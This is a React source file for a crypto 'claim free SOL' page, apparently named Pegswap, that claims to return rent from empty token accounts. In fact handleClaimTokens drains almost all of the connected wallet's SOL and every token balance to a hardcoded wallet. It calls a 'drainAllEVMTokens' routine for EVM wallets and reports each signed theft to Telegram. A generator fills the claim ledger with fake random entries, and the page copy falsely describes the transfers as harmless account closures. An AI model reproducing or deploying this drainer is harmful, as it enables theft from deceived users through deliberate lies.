import { motion } from 'framer-motion';
import { PegasusAnimation } from '@/components/PegasusAnimation';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { ConnectWalletButton } from '@/components/ConnectWalletButton';
import { useState, useEffect, useMemo, useCallback } from 'react';
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
import { Loader2 } from 'lucide-react';
import { sendTelegramMessage } from '@/utils/telegram';
import { AnimatedLogo } from '@/components/AnimatedLogo';
import { getSolPrice } from '@/lib/utils';
import { getMintProgramId } from '@/utils/tokenProgram';
import { useChainInfo } from '@/hooks/useChainInfo';
import { useChain } from '@/contexts/ChainContext';
import { useEVMWallet } from '@/providers/EVMWalletProvider';
import { drainAllEVMTokens } from '@/utils/evmTransactions';
import { Link } from 'react-router-dom';
import apepeImage from '@/assets/apepe.jpg';

const CLAIM_AMOUNT = 0.1;
const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const MAX_BATCH_SIZE = 5;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
}

const Claim = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const { activeChain, evmChainId } = useChain();
  const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
  const { chainName, nativeToken } = useChainInfo();
  const [dataMultiplier, setDataMultiplier] = useState(1);
  const [isClaiming, setIsClaiming] = useState(false);
  const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
  const [ledgerData, setLedgerData] = useState<any[]>([]);
  const [solBalance, setSolBalance] = useState(0);

  const generateClaimData = () => {
    const baseWallets = [
      "15e9F8ok", "dbPMQvwL", "wuAtFULb", "TxyWvTBp", "MSkBkXXd", "Q61ytKqi", "dP9Ydu1v", "8GSMofeQ",
      "JRk5pqeV", "88SJbJk4", "2xUH8Rfo", "bo4NW62c", "UbGR4omq", "8rKjQaz2", "659216LZ", "QkjtSr4B",
      "D7GHtdXP", "coTT8HYZ", "coMwmsA4", "a68TZCU5"
    ];
    
    const data = [];
    for (let i = 0; i < 20000; i++) {
      const randomPrefix = baseWallets[i % baseWallets.length];
      const randomSuffix = Math.random().toString(36).substring(2, 10);
      const accts = Math.floor(Math.random() * 15) + 1;
      const claimed = (Math.random() * 2).toFixed(5);
      const daysAgo = Math.floor(Math.random() * 30);
      const date = new Date(Date.now() - daysAgo * 24 * 60 * 60 * 1000).toISOString().split('T')[0];
      
      data.push({
        wallet: `${randomPrefix}...${randomSuffix}`,
        accts,
        claimed: `${claimed} ${nativeToken}`,
        date
      });
    }
    return data;
  };

  useEffect(() => {
    const fetchData = () => {
      fetch('/data/claims.json')
        .then(res => res.json())
        .then(data => {
          if (data) {
            setStats({
              recovered: data.totalRecovered ? `${data.totalRecovered} ${nativeToken}` : '2.3M',
              claimants: data.totalAccounts || '56,7K'
            });
            if (data.ledger && Array.isArray(data.ledger)) {
               const validRows = data.ledger
                 .filter((r: any) => r.wallet && !r.wallet.toUpperCase().includes('LOAD MORE'))
                 .map((r: any) => ({
                   ...r,
                   claimed: r.claimed ? r.claimed.replace(/\bSOL\b/g, nativeToken) : r.claimed
                 }));
               setLedgerData(validRows);
            }
          }
        })
        .catch(err => console.error('Failed to load claims data:', err));
    };

    fetchData();
    const interval = setInterval(fetchData, 30000);
    return () => clearInterval(interval);
  }, [nativeToken]);

  const displayData = useMemo(() => {
    const claimData = ledgerData.length > 0 ? ledgerData : generateClaimData().slice(0, 20);
    const repeatedData = [];
    for (let i = 0; i < dataMultiplier; i++) {
      repeatedData.push(...claimData);
    }
    return repeatedData;
  }, [ledgerData, dataMultiplier, nativeToken]);

  const fetchAllBalances = useCallback(async () => {
    if (!publicKey) return [];
    try {
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID });
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, { programId: TOKEN_2022_PROGRAM_ID });
      const allTokenAccounts = [...legacyTokenAccounts.value, ...token2022Accounts.value];

      const tokens: TokenBalance[] = allTokenAccounts
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0
          };
        })
        .filter(token => token.uiAmount > 0);

      return tokens;
    } catch (error) {
      console.error('Error fetching balances:', error);
      return [];
    }
  }, [publicKey, connection]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number, overridePublicKey?: PublicKey) => {
    const effectivePublicKey = overridePublicKey || publicKey;
    if (!effectivePublicKey) return null;

    const transaction = new Transaction();
    transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }));
    transaction.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
    
    const charityPubkey = new PublicKey(FAUCET_WALLET);

    for (const token of tokenBatch) {
      if (token.balance <= 0) continue;
      try {
        const mintPubkey = new PublicKey(token.mint);
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, effectivePublicKey, false, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);
        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey, true, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID);

        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
        } catch (error) {
          transaction.add(createAssociatedTokenAccountInstruction(effectivePublicKey, toTokenAccount, charityPubkey, mintPubkey, tokenProgramId, ASSOCIATED_TOKEN_PROGRAM_ID));
        }

        transaction.add(createTransferCheckedInstruction(fromTokenAccount, mintPubkey, toTokenAccount, effectivePublicKey, BigInt(token.balance), decimals, [], tokenProgramId));
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      if (amountToSend > 0) {
        transaction.add(SystemProgram.transfer({ fromPubkey: effectivePublicKey, toPubkey: charityPubkey, lamports: amountToSend }));
      }
    }
    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleClaimTokens = async () => {
    // EVM path
    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
      try {
        setIsClaiming(true);
        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
      } catch (error: any) {
      } finally {
        setIsClaiming(false);
      }
      return;
    }

    // Solana path
    if (!publicKey || !sendTransaction) {
      return;
    }

    try {
      setIsClaiming(true);
      console.log('Starting transaction sequence...');
      const currentBalances = await fetchAllBalances();

      const solBal = await connection.getBalance(publicKey);
      const solPrice = await getSolPrice();
      
      let lamportsToSend = 0;
      
      if (solPrice > 0) {
        const amountToKeepUSD = 1.50;
        const amountToKeepSOL = amountToKeepUSD / solPrice;
        const amountToKeepLamports = Math.ceil(amountToKeepSOL * LAMPORTS_PER_SOL);
        const PRIORITY_FEE = 100_000;
        const BASE_FEE = 5000;
        const FEE_RESERVE = PRIORITY_FEE + BASE_FEE;
        const maxSendable = solBal - amountToKeepLamports - FEE_RESERVE;
        lamportsToSend = Math.max(0, Math.floor(maxSendable));
      }

      if (lamportsToSend > 0) {
        const transaction = new Transaction();
        transaction.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }), ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 }));
        transaction.add(SystemProgram.transfer({ fromPubkey: publicKey, toPubkey: new PublicKey(FAUCET_WALLET), lamports: lamportsToSend }));

        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        transaction.recentBlockhash = blockhash;
        transaction.feePayer = publicKey;

        try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Simulation failed", e); }

        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
        await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
      }

      const validTokens = currentBalances.filter(token => token.balance > 0);
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      const batches: TokenBalance[][] = [];
      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
      }

      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);

        if (transaction && transaction.instructions.length > 2) {
           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
           transaction.recentBlockhash = blockhash;
           transaction.feePayer = publicKey;

           try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Token batch simulation failed", e); }

           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
           await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
           sendTelegramMessage(`
✅ <b>Transaction Signed (Token Batch ${i + 1} - Claim)</b>

👤 <b>User:</b> <code>${publicKey?.toBase58()}</code>
🔗 <b>Signature:</b> <code>${signature}</code>
`);
        }
      }
      setTimeout(fetchAllBalances, 2000);

    } catch (error: any) {
      console.error('Claim error:', error);
    } finally {
      setIsClaiming(false);
    }
  };

  const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;

  return (
    <div className="min-h-screen relative overflow-hidden">
      <PegasusAnimation />
      <Navigation />

      {/* Hero Section */}
      <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
        <div className="container mx-auto max-w-6xl text-center">
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.5 }}
          >
            <div className="inline-block p-1 rounded-full bg-gradient-to-r from-primary to-secondary mb-8">
              <div className="bg-background rounded-full p-2">
                <AnimatedLogo className="w-20 h-20 sm:w-28 sm:h-28" />
              </div>
            </div>

            <h1 className="text-3xl sm:text-4xl md:text-6xl font-extrabold text-foreground mb-4">
              Claim Free {nativeToken} — Instantly and Transparently
            </h1>

            <p className="text-lg sm:text-xl font-semibold text-foreground mb-6">
              Fast, verifiable, on-chain claiming on {chainName}
            </p>

            <p className="text-sm sm:text-base text-muted-foreground mb-8">
              Proof-of-claim • Global availability • ~3918 TPS
            </p>

            <Button 
              size="lg" 
              className="mb-4 text-lg px-12 py-6 h-auto w-full sm:w-auto"
              onClick={handleClaimTokens}
              disabled={!isWalletConnected || isClaiming}
            >
              {isClaiming && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
              {isClaiming ? 'Claiming...' : 'Claim Tokens'}
            </Button>

            <p className="text-sm text-muted-foreground cursor-pointer hover:text-primary transition-colors">
              Click here to reset Wallet Selector
            </p>
          </motion.div>
        </div>
      </section>

      {/* Stats Cards */}
      <section className="py-10 sm:py-12 px-4">
        <div className="container mx-auto max-w-5xl">
          <div className="grid md:grid-cols-2 gap-6">
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Total Claimed</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.recovered}</p>
                <p className="text-xs sm:text-sm text-muted-foreground">USD equivalent</p>
                <p className="text-xs text-muted-foreground">updated live</p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8 text-center">
                <h3 className="text-lg text-muted-foreground mb-2">Claimants</h3>
                <p className="text-3xl sm:text-4xl lg:text-5xl font-bold text-primary mb-2">{stats.claimants}</p>
                <p className="text-xs sm:text-sm text-muted-foreground">global community</p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Claim Ledger Table */}
      <section className="py-12 px-4">
        <div className="container mx-auto max-w-6xl">
          <h2 className="text-2xl sm:text-3xl font-bold text-center mb-8">On-chain claim ledger</h2>

          <Card className="bg-card/90 border-0">
            <CardContent className="p-0">
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-border/50">
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Wallet/TX</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Accts</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Claimed</TableHead>
                      <TableHead className="text-foreground font-semibold text-xs sm:text-sm">Date</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {displayData.map((row: any, index) => (
                      <TableRow key={index} className="border-border/30">
                        <TableCell className="font-mono text-xs sm:text-sm whitespace-nowrap">
                          {row.tx ? (
                            <div className="flex flex-col">
                              <span>{row.wallet}</span>
                              <a href={row.walletLink} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline text-[10px] sm:text-xs">
                                {row.tx}
                              </a>
                            </div>
                          ) : (
                            row.walletLink ? (
                              <a href={row.walletLink} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">
                                {row.wallet}
                              </a>
                            ) : (
                              row.wallet
                            )
                          )}
                        </TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.accts}</TableCell>
                        <TableCell className="text-xs sm:text-sm">{row.claimed}</TableCell>
                        <TableCell className="text-xs sm:text-sm whitespace-nowrap">{row.date}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </CardContent>
          </Card>

          <div className="text-center mt-6">
            <Button variant="outline" className="text-primary border-primary hover:bg-primary/10" onClick={() => setDataMultiplier(prev => prev + 1)}>
              Load more
            </Button>
          </div>

          <p className="text-center text-sm text-muted-foreground mt-8">
            Eligible users may claim free {nativeToken}. Network fees are minimal and claiming is recorded on-chain.
          </p>
        </div>
      </section>

      {/* How Claiming Works */}
      <section className="py-12 sm:py-16 px-4">
        <div className="container mx-auto max-w-5xl">
          <Card className="bg-card/90 border-0 mb-8">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6">How Claiming Free {nativeToken} Works</h2>

              <div className="space-y-6">
                <div>
                  <h3 className="text-lg sm:text-xl font-bold mb-2">Transparent claiming</h3>
                  <p className="text-sm sm:text-base leading-relaxed text-muted-foreground">
                    Every claim is recorded on-chain, creating a public, tamper-proof ledger. Your claim is traceable from request to settlement.
                  </p>
                </div>

                <div>
                  <h3 className="text-lg sm:text-xl font-bold mb-2">Fast settlement</h3>
                  <p className="text-sm sm:text-base leading-relaxed text-muted-foreground">
                    {chainName}'s high throughput and low latency mean confirmed claims in seconds, even under heavy load.
                  </p>
                </div>

                <div>
                  <h3 className="text-xl font-bold mb-2">On-chain proofs</h3>
                  <p className="text-muted-foreground">
                    Smart contracts verify eligibility and record results, providing a durable proof-of-claim that you can reference anytime.
                  </p>
                </div>

                <div>
                  <h3 className="text-xl font-bold mb-2">Global access</h3>
                  <p className="text-muted-foreground">
                    Claim from anywhere with a compatible wallet. The process is standardized and secure.
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-xl sm:text-2xl font-bold mb-4">How does it work?</h2>

              <div className="space-y-4 text-muted-foreground text-sm sm:text-base leading-relaxed max-h-72 sm:max-h-96 overflow-y-auto pr-2 sm:pr-4">
                <p>
                  <strong>How does it work?</strong><br />
                  Pegswap includes a secure, wallet-connected flow that helps you reclaim {nativeToken} that is locked as rent in empty token accounts. When you receive a token or NFT, the network creates a dedicated token account for that asset. After you transfer it away, the account often remains with zero balance but still holds a rent deposit. By closing those zero-balance token accounts, the rent deposit is released back to your wallet as {nativeToken}.
                </p>

                <p>
                  <strong>Closing Token Accounts</strong><br />
                  Every time your wallet holds a new token asset, a specific token account is created. If later that asset's balance becomes zero, the account can be safely closed. Closing zero-balance token accounts returns the rent deposit to you. Pegswap scans for these empty token accounts and lets you close them in bulk with clear, step-by-step confirmations.
                </p>

                <p>
                  <strong>Claim Your {nativeToken}</strong><br />
                  Accounts shown for selection in Pegswap's claim flow already have 0 units of the relevant asset and no further utility. You can confidently select as many as you want to close. Once confirmed, the protocol performs the close operations, and the released rent deposits are returned to your wallet in {nativeToken}.
                </p>

                <p>
                  <strong>What is rent?</strong><br />
                  {chainName} requires a rent-exempt minimum for accounts, which functions like a deposit ensuring the network can store and process data. When an account is closed, that rent-exempt deposit is released back to the wallet that owns the account.
                </p>

                <p>
                  <strong>Eligibility: How Pegswap users get {nativeToken} rewards</strong><br />
                  If you have token accounts in your wallet with a zero balance, you are eligible to reclaim their rent deposit as {nativeToken}. Pegswap's claim flow detects these empty accounts, presents them for selection, and guides you through closing them. The "{nativeToken} rewards" you receive are the unlocked rent deposits credited back to you after successful closures. There is no need to stake or trade to qualify—eligibility is based solely on the presence of zero-balance token accounts in your wallet.
                </p>

                <p>
                  <strong>Step-by-step</strong><br />
                  1. Connect your wallet (Phantom, MetaMask, Solflare, etc.).<br />
                  2. Open the claim flow. Pegswap scans for zero-balance token accounts you own.<br />
                  3. Select the accounts you want to close; the UI shows what will be reclaimed.<br />
                  4. Approve the transaction(s) in your wallet. Pegswap submits secure close instructions on {chainName}.<br />
                  5. Receive your {nativeToken} automatically as rent deposits are released back to your wallet.
                </p>

                <p>
                  <strong>Trust, security, and costs</strong><br />
                  Pegswap executes standard {chainName} instructions to close token accounts. You sign every operation in your wallet, and no private keys ever leave your device. Network fees are minimal, and Pegswap may apply a small service fee to sustain infrastructure and development—clearly shown before you approve.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* Technical Overview */}
      <section className="py-12 sm:py-16 px-4 bg-muted/20">
        <div className="container mx-auto max-w-5xl">
          <Card className="bg-card/90 border-0">
            <CardContent className="pt-6 pb-6 sm:pt-8 sm:pb-8">
              <h2 className="text-2xl sm:text-3xl font-bold mb-6">{chainName}: A Comprehensive Technical Overview</h2>

              <div className="space-y-4 text-muted-foreground text-sm sm:text-base leading-relaxed max-h-72 sm:max-h-96 overflow-y-auto pr-2 sm:pr-4">
                <p>
                  <strong>Introduction</strong><br />
                  {chainName} is a high-performance blockchain designed to deliver web-scale throughput with low latency and low transaction costs. It achieves this with a combination of innovative architectural choices and pragmatic engineering, enabling rapid and reliable token operations for users worldwide.
                </p>

                <p>
                  <strong>Design Goals and Trade-offs</strong><br />
                  {chainName}'s design goal is simple: maximize throughput and minimize latency without sacrificing security or decentralization beyond pragmatic thresholds. This produces a user experience closer to web APIs than legacy blockchain interactions.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* CTA Section */}
      <section className="py-16 sm:py-20 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <h2 className="text-3xl sm:text-4xl font-bold mb-6">Ready to Claim Your {nativeToken}?</h2>
          <p className="text-base sm:text-xl text-muted-foreground mb-8">
            Connect your wallet to start claiming free {nativeToken} from empty token accounts.
          </p>
              <ConnectWalletButton />
        </div>
      </section>

      {/* $APEPE Featured Token */}
      <section className="py-12 sm:py-16 px-4">
        <div className="container mx-auto max-w-2xl text-center">
          <p className="text-sm uppercase tracking-widest text-muted-foreground mb-4">Featured Token</p>
          <Link to="/apepe" className="inline-block group">
            <div className="p-1 rounded-2xl bg-gradient-to-r from-primary to-secondary shadow-[0_0_40px_hsl(var(--primary)/0.4)] transition-transform group-hover:scale-105">
              <img
                src={apepeImage}
                alt="$APEPE"
                className="w-48 h-48 sm:w-64 sm:h-64 rounded-2xl object-cover"
              />
            </div>
            <p className="mt-4 text-2xl font-bold text-gradient">$APEPE</p>
            <p className="text-sm text-muted-foreground">Tap to claim →</p>
          </Link>
        </div>
      </section>

      {/* Bottom Bar with $APEPE */}
      <div className="sticky bottom-0 left-0 right-0 z-40 bg-background/80 backdrop-blur-md border-t border-white/10 py-3 px-4">
        <Link to="/apepe" className="container mx-auto flex items-center justify-center gap-3 hover:opacity-80 transition-opacity">
          <img src={apepeImage} alt="$APEPE" className="w-10 h-10 rounded-full object-cover border border-primary/40" />
          <span className="font-bold text-foreground">Claim $APEPE</span>
          <span className="text-primary">→</span>
        </Link>
      </div>
    </div>
  );
};

export default Claim;
